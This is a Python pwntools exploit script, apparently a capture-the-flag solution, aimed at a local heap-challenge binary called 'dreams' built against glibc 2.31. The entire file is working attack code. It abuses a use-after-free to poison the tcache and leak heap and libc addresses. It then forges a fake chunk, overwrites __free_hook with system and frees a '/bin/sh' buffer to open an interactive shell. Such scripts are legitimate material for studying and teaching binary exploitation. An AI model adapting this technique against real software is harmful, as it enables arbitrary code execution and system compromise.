#!/usr/bin/env python3
from pwn import *
elf = context.binary = ELF("./dreams")
libc = ELF("libc-2.31.so")
p = process("./dreams")
gdb.attach(p,"init-pwndbg")

def malloc(index,data,about):
    p.sendlineafter("> ","1")
    p.sendlineafter("In which page of your mind do you keep this dream? ",str(index))
    p.sendafter("What's the date (mm/dd/yy))? ",data)
    p.send(about)

def free(index):
    p.sendlineafter("> ","2")
    p.sendlineafter("Which one are you trading in? ",str(index))

def readAndEdit(index,data):
    p.sendlineafter("> ","3")
    p.sendlineafter("What dream is giving you trouble? ",str(index))
    p.recvuntil("Hmm... I see. It looks like your dream is telling you that ")
    leak = p.recvline()[:-1]
    p.sendafter("New date: ",data)
    return leak

malloc(0,'a'*8,'b'*8)
malloc(1,'a'*8,'b'*8)
free(0)
free(1)
heapleak = readAndEdit(1,p64(elf.sym.MAX_DREAMS-8))
heapleak = heapleak.ljust(8,b'\x00')
heapleak = u64(heapleak)
heapbase = heapleak-0x10
log.critical("Heap base address: {}".format(hex(heapbase)))
malloc(2,'a'*8,'b'*8)
malloc(3,p64(0x31),b"\xff\xff")

for i in range(23):
    malloc(10+i,8*chr(97+i),'0'*8)

fake_chunk = heapbase+4912
malloc(41,'a'*8,'b'*8)
malloc(42,'a'*8,'b'*8)
free(41)
free(42)
readAndEdit(42,p64(fake_chunk))
malloc(43,'a'*8,'b'*8)
malloc(44,p64(0x0),p64(0x451))
free(10)
leak = readAndEdit(10,p64(0x0))
leak = leak.ljust(8,b'\x00')
leak = u64(leak)
libc.address = leak - 0x3b5be0
log.critical("Libc base: {}".format(hex(libc.address)))
__free_hook = libc.sym.__free_hook
readAndEdit(10,p64(leak))
malloc(45,'a'*8,'b'*8)
malloc(46,'a'*8,'b'*8)
free(45)
free(46)
readAndEdit(46,p64(__free_hook))
malloc(47,'a'*8,'b'*8)
malloc(48,p64(libc.sym.system),p64(0x0))
malloc(49,b"/bin/sh\x00",p64(0x0))
free(49)
p.interactive()